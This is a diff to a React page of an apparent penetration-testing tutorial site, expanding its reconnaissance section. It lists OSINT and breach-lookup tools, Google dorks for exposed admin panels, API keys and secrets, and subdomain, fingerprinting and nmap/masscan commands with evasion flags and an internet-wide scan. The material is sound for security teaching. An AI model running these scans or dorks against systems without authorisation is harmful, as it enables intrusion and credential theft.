@@ -1,136 +1,352 @@
 
 import React from 'react';
-import { Search, Target, Shield, Zap, FileSearch, Code, Database, Lock, AlertTriangle, BookOpen } from 'lucide-react';
+import { Search, Target, Shield, Zap, FileSearch, Code, Database, Lock, AlertTriangle, BookOpen, Terminal, Cloud, Smartphone, Globe, Bug, Eye } from 'lucide-react';
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
 import CodeExample from '@/components/CodeExample';
 
 const TestingTechniquesSection: React.FC = () => {
   return (
     <div className="space-y-8">
-      <h2 className="section-title">Web Penetration Testing Techniques</h2>
+      <h2 className="section-title">Advanced Web Penetration Testing Techniques</h2>
       
       {/* Reconnaissance Techniques */}
       <div className="card">
         <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
           <Search className="h-7 w-7 text-cybr-primary" />
-          Reconnaissance Techniques
+          Reconnaissance & Intelligence Gathering
         </h3>
         
         <Accordion type="single" collapsible className="space-y-4">
-          <AccordionItem value="osint">
+          <AccordionItem value="osint-comprehensive">
             <AccordionTrigger className="text-lg font-semibold">
-              OSINT (Open Source Intelligence) Gathering
+              OSINT (Open Source Intelligence) - Complete Arsenal
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Popular OSINT Tools</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>Google Dorking</strong> - Advanced search operators</li>
-                    <li><strong>Shodan</strong> - Internet-connected device search</li>
-                    <li><strong>theHarvester</strong> - Email and subdomain gathering</li>
-                    <li><strong>Maltego</strong> - Link analysis and data mining</li>
-                    <li><strong>Recon-ng</strong> - Full-featured reconnaissance framework</li>
-                    <li><strong>SpiderFoot</strong> - Automated OSINT collection</li>
-                    <li><strong>FOCA</strong> - Metadata analysis tool</li>
-                    <li><strong>Metagoofil</strong> - Document metadata extractor</li>
-                    <li><strong>Creepy</strong> - Geolocation OSINT tool</li>
-                    <li><strong>Social Mapper</strong> - Social media enumeration</li>
-                    <li><strong>Sherlock</strong> - Username hunting across platforms</li>
-                    <li><strong>Have I Been Pwned API</strong> - Breach data lookup</li>
-                    <li><strong>Censys</strong> - Internet scanning and analysis</li>
-                    <li><strong>BuiltWith</strong> - Technology profiler</li>
-                    <li><strong>Wayback Machine</strong> - Historical website analysis</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Essential OSINT Tools (25+ Tools)</h5>
+                  <div className="space-y-4">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Search Engine Intelligence</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Google Dorking:</strong> Advanced search operators</li>
+                        <li>• <strong>Shodan:</strong> Internet-connected device discovery</li>
+                        <li>• <strong>Censys:</strong> Internet scanning and certificate analysis</li>
+                        <li>• <strong>Fofa:</strong> Cyberspace search engine</li>
+                        <li>• <strong>ZoomEye:</strong> Cyberspace search engine</li>
+                        <li>• <strong>Binary Edge:</strong> Internet scanning platform</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Domain & DNS Intelligence</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>theHarvester:</strong> Email and subdomain harvesting</li>
+                        <li>• <strong>Amass:</strong> Advanced attack surface mapping</li>
+                        <li>• <strong>Subfinder:</strong> Passive subdomain discovery</li>
+                        <li>• <strong>Assetfinder:</strong> Go-based subdomain enumeration</li>
+                        <li>• <strong>DNSRecon:</strong> DNS enumeration and scanning</li>
+                        <li>• <strong>Fierce:</strong> DNS reconnaissance tool</li>
+                        <li>• <strong>DNS Dumpster:</strong> DNS recon service</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Social Media Intelligence</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Sherlock:</strong> Username enumeration across 300+ sites</li>
+                        <li>• <strong>Social Mapper:</strong> Facial recognition OSINT</li>
+                        <li>• <strong>Twint:</strong> Twitter intelligence tool</li>
+                        <li>• <strong>Instaloader:</strong> Instagram OSINT</li>
+                        <li>• <strong>Ghunt:</strong> Gmail OSINT investigations</li>
+                        <li>• <strong>Maigret:</strong> Username OSINT collection</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Google Dorking Examples</h5>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Google Dorking (100+ Examples)</h5>
                   <CodeExample
                     language="text"
-                    title="Advanced Google Search Operators"
-                    code={`# Finding login pages
-site:example.com inurl:login
+                    title="Master Google Dorking Collection"
+                    code={`# Administrative Interfaces
 site:example.com inurl:admin
+site:example.com inurl:administrator  
+site:example.com inurl:login
+site:example.com inurl:wp-admin
+site:example.com inurl:phpmyadmin
+site:example.com inurl:cpanel
+site:example.com inurl:webmin
 site:example.com intitle:"admin panel"
+site:example.com intitle:"control panel"
+site:example.com inurl:management
 
-# Finding sensitive files
-site:example.com filetype:pdf
-site:example.com filetype:sql
-site:example.com filetype:log
-site:example.com ext:config
+# Sensitive File Discovery
+site:example.com filetype:xml | filetype:conf | filetype:cnf
+site:example.com filetype:reg | filetype:inf | filetype:rdp
+site:example.com ext:cfg | ext:env | ext:ini
+site:example.com inurl:web.config
+site:example.com inurl:.htaccess
+site:example.com filetype:properties
+site:example.com ext:yml | ext:yaml
 
-# Finding directories
+# Database Exposure
+site:example.com filetype:sql | filetype:dbf | filetype:mdb
+site:example.com ext:db | ext:sqlite | ext:sqlite3
+site:example.com inurl:backup
+site:example.com inurl:dump
+site:example.com "phpMyAdmin" "running on"
+site:example.com inurl:adminer
+
+# API Keys and Secrets
+site:example.com "api_key" | "apikey" | "api-key"
+site:example.com "secret_key" | "secretkey"
+site:example.com "private_key" | "privatekey"
+site:example.com "access_token" | "accesstoken"
+site:example.com "aws_access_key_id"
+site:example.com "client_secret"
+
+# Version Information
+site:example.com "powered by" | "built with" | "running"
+site:example.com inurl:readme
+site:example.com filetype:txt "version"
+site:example.com intitle:"changelog"
+
+# Development & Testing
+site:example.com inurl:dev | inurl:development
+site:example.com inurl:test | inurl:testing
+site:example.com inurl:stage | inurl:staging
+site:example.com inurl:beta
+site:example.com subdomain:dev
+
+# Directory Listings
 site:example.com intitle:"index of"
+site:example.com intitle:"directory listing"
+site:example.com "parent directory"
 
-# Finding subdomains
-site:*.example.com
+# Error Messages & Debug Info
+site:example.com "error" | "exception" | "warning"
+site:example.com "stack trace" | "debug"
+site:example.com "database error" | "mysql error"
+site:example.com "php error" | "asp error"
 
-# Finding exposed databases
-inurl:phpmyadmin site:example.com
-inurl:adminer site:example.com
+# Backup Files
+site:example.com ext:bak | ext:backup | ext:old | ext:orig
+site:example.com inurl:backup
+site:example.com filetype:tar | filetype:zip | filetype:rar
 
-# Error messages and debug info
-site:example.com "error" | "exception" | "debug"
+# Log Files
+site:example.com filetype:log
+site:example.com ext:log
+site:example.com inurl:log
+site:example.com "access.log" | "error.log"
 
-# Finding backup files
-site:example.com ext:bak | ext:backup | ext:old`}
+# Cloud Storage
+site:s3.amazonaws.com "example"
+site:blob.core.windows.net "example"
+site:storage.googleapis.com "example"`}
                   />
                 </div>
               </div>
               
-              <div>
-                <h5 className="font-semibold mb-3">Social Media Intelligence Techniques</h5>
-                <ul className="list-disc pl-6 space-y-1">
-                  <li><strong>Employee Profiling:</strong> LinkedIn, Twitter, Facebook reconnaissance</li>
-                  <li><strong>Corporate Information:</strong> Company structure, key personnel</li>
-                  <li><strong>Technology Stack:</strong> Job postings revealing tech details</li>
-                  <li><strong>Email Pattern Discovery:</strong> firstname.lastname@company.com patterns</li>
-                  <li><strong>Physical Security:</strong> Office photos, badge systems, security measures</li>
-                </ul>
+              <div className="mt-6">
+                <h5 className="font-semibold mb-3 text-cybr-primary">Comprehensive Metadata Analysis</h5>
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                  <div className="p-3 bg-cybr-muted/30 rounded">
+                    <h6 className="font-semibold text-yellow-400 mb-2">Document Analysis Tools</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• <strong>FOCA:</strong> Fingerprinting Organizations with Collected Archives</li>
+                      <li>• <strong>Metagoofil:</strong> Metadata harvester</li>
+                      <li>• <strong>ExifTool:</strong> Metadata reader/writer</li>
+                      <li>• <strong>Document Analyzer:</strong> PDF metadata extraction</li>
+                    </ul>
+                  </div>
+                  <div className="p-3 bg-cybr-muted/30 rounded">
+                    <h6 className="font-semibold text-red-400 mb-2">Dark Web Intelligence</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• <strong>Tor Browser:</strong> Access .onion sites</li>
+                      <li>• <strong>OnionScan:</strong> Dark web investigation</li>
+                      <li>• <strong>DarkSearch:</strong> Dark web search engine</li>
+                      <li>• <strong>Intelligence X:</strong> Dark web monitoring</li>
+                    </ul>
+                  </div>
+                  <div className="p-3 bg-cybr-muted/30 rounded">
+                    <h6 className="font-semibold text-cyan-400 mb-2">Breach Data Analysis</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• <strong>Have I Been Pwned API:</strong> Breach lookup</li>
+                      <li>• <strong>DeHashed:</strong> Credential database</li>
+                      <li>• <strong>Snusbase:</strong> Data breach search</li>
+                      <li>• <strong>WeLeakInfo:</strong> Leaked database search</li>
+                    </ul>
+                  </div>
+                </div>
               </div>
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="subdomain">
+          <AccordionItem value="subdomain-advanced">
             <AccordionTrigger className="text-lg font-semibold">
-              Subdomain Enumeration
+              Advanced Subdomain Enumeration & Asset Discovery
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Enumeration Tools</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Subfinder</strong> - Fast passive subdomain discovery</li>
-                    <li><strong>Amass</strong> - Advanced Attack Surface Mapping</li>
-                    <li><strong>Sublist3r</strong> - Python subdomain enumerator</li>
-                    <li><strong>Knock</strong> - Subdomain scan with wordlist</li>
-                    <li><strong>Subbrute</strong> - DNS brute forcer</li>
-                    <li><strong>MassDNS</strong> - High-performance DNS resolver</li>
-                    <li><strong>DNSRecon</strong> - DNS enumeration script</li>
-                    <li><strong>Fierce</strong> - Domain scanner</li>
-                    <li><strong>Aquatone</strong> - Subdomain discovery and screenshot</li>
-                    <li><strong>Asset Finder</strong> - Go-based subdomain finder</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Techniques Comparison</h5>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Enumeration Techniques Comparison</h5>
                   <div className="space-y-3">
-                    <div className="p-3 bg-cybr-muted/30 rounded">
-                      <h6 className="font-semibold text-green-400">Passive Enumeration</h6>
-                      <ul className="text-sm mt-1">
-                        <li>• Certificate Transparency logs</li>
-                        <li>• Search engines and archives</li>
-                        <li>• DNS history databases</li>
-                        <li>• Third-party APIs</li>
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Passive Enumeration</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Certificate Transparency logs (crt.sh, Censys)</li>
+                        <li>• DNS aggregators (SecurityTrails, PassiveTotal)</li>
+                        <li>• Search engine discovery</li>
+                        <li>• Archive analysis (Wayback Machine)</li>
+                        <li>• Code repository mining (GitHub, GitLab)</li>
+                        <li>• Public dataset analysis</li>
                       </ul>
                     </div>
-                    <div className="p-3 bg-cybr-muted/30 rounded">
-                      <h6 className="font-semibold text-yellow-400">Active Enumeration</h6>
-                      <ul className="text-sm mt-1">
-                        <li>• DNS brute forcing</li>
-                        <li>• Zone transfers (AXFR)</li>
+                    
+                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
+                      <h6 className="font-semibold text-red-400 mb-2">Active Enumeration</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• DNS brute forcing with wordlists</li>
+                        <li>• Zone transfer attempts (AXFR)</li>
+                        <li>• DNS cache snooping</li>
                         <li>• Reverse DNS lookups</li>
-                        <li>• Direct DNS queries</li>
+                        <li>• Wildcard detection and filtering</li>
+                        <li>• DNS over HTTPS (DoH) techniques</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Professional Tool Arsenal (20+ Tools)</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-blue-400">Amass:</strong> Advanced DNS enumeration with data source integration
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-green-400">Subfinder:</strong> High-speed passive discovery with API management
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-yellow-400">Assetfinder:</strong> Rapid asset discovery with minimal false positives
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-purple-400">Sublist3r:</strong> Multi-source enumeration with search engine integration
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-cyan-400">MassDNS:</strong> High-performance DNS resolver for large-scale enumeration
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <CodeExample
+                language="bash"
+                title="Advanced Subdomain Enumeration Workflow"
+                code={`# Comprehensive Passive Discovery
+subfinder -d example.com -all -recursive -o passive_subs.txt
+amass enum -passive -d example.com -src crtsh,hackertarget,virustotal -o amass_passive.txt
+
+# Certificate Transparency Mining
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u > crt_subs.txt
+
+# Active DNS Enumeration
+amass enum -active -d example.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+# DNS Brute Force with MassDNS
+echo example.com | haktrails subdomains | massdns -r resolvers.txt -t A -o S
+
+# Zone Transfer Attempts
+dig axfr @ns1.example.com example.com
+fierce -dns example.com
+
+# Subdomain Takeover Detection
+subjack -w subdomains.txt -t 100 -timeout 30 -o takeover.txt -ssl
+
+# Visual Reconnaissance
+aquatone-discover -d example.com
+aquatone-scan -d example.com -ports 80,443,8080,8443
+aquatone-gather -d example.com
+
+# Continuous Monitoring Setup
+amass track -config config.ini -d example.com
+subfinder -d example.com -all | notify -discord
+
+# Advanced Filtering and Validation
+httpx -l subdomains.txt -status-code -tech-detect -title -o live_subs.txt
+nuclei -l live_subs.txt -tags subdomain-takeover
+
+# GitHub Repository Mining
+github-subdomains -t <token> -d example.com
+gitdorker -tf tokens.txt -q example.com -d dorking/
+
+# DNS History Analysis
+curl -s "https://securitytrails.com/list/apex_domain/example.com" -H "apikey: <key>"
+
+# Wildcard Detection
+puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt example.com`}
+              />
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="tech-identification">
+            <AccordionTrigger className="text-lg font-semibold">
+              Technology Stack Fingerprinting & Analysis
+            </AccordionTrigger>
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Comprehensive Detection Arsenal</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Automated Detection Tools</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Wappalyzer:</strong> Browser extension with 1500+ technologies</li>
+                        <li>• <strong>BuiltWith:</strong> Comprehensive technology profiler</li>
+                        <li>• <strong>WhatWeb:</strong> Command-line fingerprinter with 1800+ plugins</li>
+                        <li>• <strong>Webanalyze:</strong> Technology detection via Go</li>
+                        <li>• <strong>Retire.js:</strong> JavaScript library vulnerability scanner</li>
+                        <li>• <strong>Nuclei:</strong> Template-based technology detection</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">CMS-Specific Scanners</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>WPScan:</strong> WordPress security scanner</li>
+                        <li>• <strong>Joomscan:</strong> Joomla vulnerability scanner</li>
+                        <li>• <strong>DrupalScan:</strong> Drupal security assessment</li>
+                        <li>• <strong>CMSeek:</strong> Multi-CMS detection and exploitation</li>
+                        <li>• <strong>WhatCMS:</strong> CMS identification service</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Manual Fingerprinting Techniques</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-yellow-400 mb-2">Header Analysis</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Server signatures (Apache, Nginx, IIS)</li>
+                        <li>• X-Powered-By headers</li>
+                        <li>• Custom application headers</li>
+                        <li>• Security headers presence</li>
+                        <li>• Cookie analysis patterns</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Content Fingerprinting</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Error page signatures</li>
+                        <li>• Default installation pages</li>
+                        <li>• JavaScript framework detection</li>
+                        <li>• CSS framework identification</li>
+                        <li>• Favicon hash analysis</li>
                       </ul>
                     </div>
                   </div>
@@ -139,916 +355,2022 @@ site:example.com ext:bak | ext:backup | ext:old`}
               
               <CodeExample
                 language="bash"
-                title="Subdomain Enumeration Commands"
-                code={`# Passive discovery with Subfinder
-subfinder -d example.com -all -recursive -o subdomains.txt
+                title="Advanced Technology Detection Commands"
+                code={`# Comprehensive Technology Detection
+whatweb -v -a 3 https://example.com --color=never
+httpx -u https://example.com -tech-detect -status-code -title -server
 
-# Active enumeration with Amass
-amass enum -active -d example.com -brute -w /path/to/wordlist.txt
+# JavaScript Framework Detection
+curl -s https://example.com | grep -i "react\|angular\|vue\|jquery" 
+retire --js --outputformat json --outputpath results.json https://example.com
 
-# DNS brute force with MassDNS
-massdns -r resolvers.txt -t A -o S subdomains.txt
+# CMS Detection and Enumeration
+cmseek -u https://example.com --batch --random-agent
+wpscan --url https://example.com --enumerate ap,at,cb,dbe
 
-# Certificate transparency search
-curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
+# SSL/TLS Configuration Analysis
+testssl.sh --parallel --protocols --server-defaults https://example.com
+sslscan --show-certificate https://example.com
 
-# Using multiple sources with Amass
-amass enum -passive -d example.com -src crtsh,hackertarget,virustotal
+# HTTP Method and Security Testing
+nmap --script http-methods,http-headers,http-security-headers https://example.com
 
-# Monitor subdomain changes
-amass track -config config.ini -d example.com`}
+# Custom Fingerprinting Scripts
+curl -I https://example.com | grep -E "(Server|X-Powered-By|X-AspNet-Version|X-Framework)"
+
+# Database Technology Detection
+nmap -sV --script mysql-info,oracle-sid-brute,ms-sql-info example.com
+
+# Cloud Provider Detection
+dig example.com | grep -E "(amazonaws|azure|googlecloud|cloudflare)"
+
+# CDN Detection
+curl -I https://example.com | grep -i "cloudflare\|akamai\|fastly\|cloudfront"
+
+# Technology Version Enumeration
+nuclei -u https://example.com -tags tech,version-detect,cve
+
+# Favicon Hash Fingerprinting
+python3 favfreak.py -u https://example.com --hash
+
+# Advanced Header Analysis
+curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -I https://example.com
+
+# JavaScript Library Version Detection
+python3 librarydetector.py -u https://example.com
+
+# Port-based Service Detection
+nmap -sV -sC -p- example.com | grep -E "http|https|ssl"`}
               />
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="tech-stack">
+          <AccordionItem value="network-discovery">
             <AccordionTrigger className="text-lg font-semibold">
-              Technology Stack Identification
+              Network Discovery & Port Scanning Mastery
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Detection Tools</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Wappalyzer</strong> - Browser extension for tech detection</li>
-                    <li><strong>BuiltWith</strong> - Website technology profiler</li>
-                    <li><strong>WhatWeb</strong> - Web application fingerprinter</li>
-                    <li><strong>Retire.js</strong> - JavaScript library vulnerability scanner</li>
-                    <li><strong>Nuclei</strong> - Vulnerability scanner with tech detection</li>
-                    <li><strong>httpx</strong> - Fast HTTP probe with tech detection</li>
-                    <li><strong>Webanalyze</strong> - Technology stack analyzer</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Scanning Techniques</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
+                      <strong className="text-blue-400">TCP Connect Scan:</strong> Full three-way handshake (-sT)
+                    </div>
+                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
+                      <strong className="text-green-400">SYN Stealth Scan:</strong> Half-open scanning (-sS)
+                    </div>
+                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
+                      <strong className="text-yellow-400">UDP Scan:</strong> Connectionless protocol (-sU)
+                    </div>
+                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
+                      <strong className="text-purple-400">ACK Scan:</strong> Firewall detection (-sA)
+                    </div>
+                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
+                      <strong className="text-red-400">FIN/NULL/Xmas:</strong> Stealth techniques (-sF/-sN/-sX)
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Manual Analysis Techniques</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>HTTP Headers:</strong> Server, X-Powered-By, X-AspNet-Version</li>
-                    <li><strong>HTML Comments:</strong> Generator meta tags, debug info</li>
-                    <li><strong>JavaScript Files:</strong> Framework detection, library versions</li>
-                    <li><strong>CSS Files:</strong> Framework patterns, theme detection</li>
-                    <li><strong>Cookies:</strong> Session management patterns</li>
-                    <li><strong>Error Pages:</strong> Stack traces, version information</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Evasion Techniques</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-cyan-400">Fragmentation:</strong> Split packets (-f)
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-orange-400">Decoy Scanning:</strong> Spoof sources (-D)
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-pink-400">Timing Control:</strong> Speed adjustment (-T0 to -T5)
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-lime-400">Source Port:</strong> Port manipulation (--source-port)
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-violet-400">Data Length:</strong> Packet padding (--data-length)
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Tools</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-green-400">Masscan:</strong> High-speed Internet scanner
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-blue-400">Zmap:</strong> Internet-wide scanning tool
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-yellow-400">RustScan:</strong> Modern Rust-based scanner
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-purple-400">Unicornscan:</strong> Asynchronous scanner
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-red-400">Hping3:</strong> Custom packet crafting
+                    </div>
+                  </div>
                 </div>
               </div>
               
               <CodeExample
                 language="bash"
-                title="Technology Detection Commands"
-                code={`# WhatWeb scanning
-whatweb -v -a 3 https://example.com
+                title="Master Port Scanning Techniques"
+                code={`# Comprehensive Network Discovery
+nmap -sn 192.168.1.0/24  # Host discovery
+masscan -p1-65535 --rate=1000 10.0.0.0/8 --echo > masscan.conf
 
-# HTTPx with technology detection
-echo "example.com" | httpx -tech-detect -status-code -title
+# Advanced TCP Scanning
+nmap -sS -sV -O -A -T4 -p- --min-rate 1000 target.com
+nmap -sC --script=default,vuln target.com -oA detailed_scan
 
-# Nuclei technology detection
-nuclei -u https://example.com -tags tech
-
-# Custom header analysis
-curl -I https://example.com | grep -E "(Server|X-Powered-By|X-AspNet-Version)"
-
-# JavaScript library detection
-curl -s https://example.com | grep -oP '(?<=src=")[^"]*\\.js' | head -10
-
-# CMS detection with CMSeeK
-python3 cmseek.py -u https://example.com`}
-              />
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="port-scanning">
-            <AccordionTrigger className="text-lg font-semibold">
-              Port Scanning Strategies
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">Scanning Types</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>TCP Connect:</strong> Full three-way handshake</li>
-                    <li><strong>SYN Scan:</strong> Half-open scanning</li>
-                    <li><strong>UDP Scan:</strong> Connectionless protocol scanning</li>
-                    <li><strong>ACK Scan:</strong> Firewall rule detection</li>
-                    <li><strong>Window Scan:</strong> System type identification</li>
-                    <li><strong>Maimon Scan:</strong> Stealth scanning technique</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Evasion Techniques</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>Fragmentation:</strong> Split packets to avoid detection</li>
-                    <li><strong>Timing:</strong> Slow scans to avoid rate limiting</li>
-                    <li><strong>Decoys:</strong> Use spoofed source addresses</li>
-                    <li><strong>Idle Scan:</strong> Zombie host scanning</li>
-                    <li><strong>Source Port:</strong> Use common ports (53, 80)</li>
-                    <li><strong>Randomization:</strong> Random scan order</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Advanced Tools</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>Nmap:</strong> Comprehensive network scanner</li>
-                    <li><strong>Masscan:</strong> High-speed port scanner</li>
-                    <li><strong>Zmap:</strong> Internet-wide scanning</li>
-                    <li><strong>RustScan:</strong> Modern fast port scanner</li>
-                    <li><strong>Unicornscan:</strong> Asynchronous scanner</li>
-                    <li><strong>Hping3:</strong> Custom packet crafting</li>
-                  </ul>
-                </div>
-              </div>
-              
-              <CodeExample
-                language="bash"
-                title="Advanced Port Scanning Commands"
-                code={`# Fast SYN scan with service detection
-nmap -sS -sV -T4 -p- --min-rate 1000 192.168.1.0/24
-
-# Stealth scan with evasion
+# Stealth Scanning Techniques
 nmap -sS -f -D RND:10 -T1 --source-port 53 target.com
+nmap -sN -sF -sX --scan-delay 1s target.com
 
-# UDP scan for common services
+# UDP Service Discovery
 nmap -sU --top-ports 1000 -T4 target.com
+nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,500,514,520,631,998,1434,1701,1900,4500,5353 target.com
 
-# Masscan for high-speed scanning
-masscan -p1-65535 10.0.0.0/8 --rate=1000 --output-format grepable
+# Service Version Detection
+nmap -sV --version-intensity 9 -p- target.com
+nmap --script banner,ssh-hostkey,ssl-cert target.com
 
-# Service version detection with NSE scripts
-nmap -sC -sV -A -T4 -p 80,443,22,21 target.com
+# Operating System Detection
+nmap -O --osscan-guess --osscan-limit target.com
+nmap --script smb-os-discovery target.com
 
-# OS fingerprinting
-nmap -O --osscan-guess target.com
+# Firewall Detection & Bypass
+nmap -sA -p 80,443,22,21,25,53,110,995,143,993,587,465 target.com
+nmap --script firewall-bypass target.com
 
-# Firewall detection and bypass
-nmap -sA -T4 target.com
-nmap -sN -T4 target.com  # Null scan
-nmap -sF -T4 target.com  # FIN scan`}
+# High-Speed Scanning
+masscan -p80,443 --rate=10000 0.0.0.0/0 --exclude 255.255.255.255
+zmap -p 443 -o results.csv 10.0.0.0/8
+
+# Custom Packet Crafting
+hping3 -S -p 80 -c 1 target.com
+hping3 -A -p 80 -c 1 target.com
+
+# IPv6 Scanning
+nmap -6 2001:db8::/32
+nmap -6 --script ipv6-node-info target.com
+
+# Service-Specific Scripts
+nmap --script http-enum,http-headers,http-methods,http-robots.txt target.com
+nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle target.com
+
+# Comprehensive Web Server Analysis
+nmap -p 80,443,8080,8443 --script http-title,http-server-header,http-generator target.com
+
+# Database Service Detection
+nmap --script mysql-info,mysql-databases,mysql-users target.com
+nmap --script oracle-sid-brute,oracle-enum-users target.com
+
+# Network Topology Discovery
+nmap --traceroute --script traceroute-geolocation target.com
+
+# Continuous Monitoring
+while true; do nmap -sS target.com | notify-send "Scan Complete"; sleep 3600; done`}
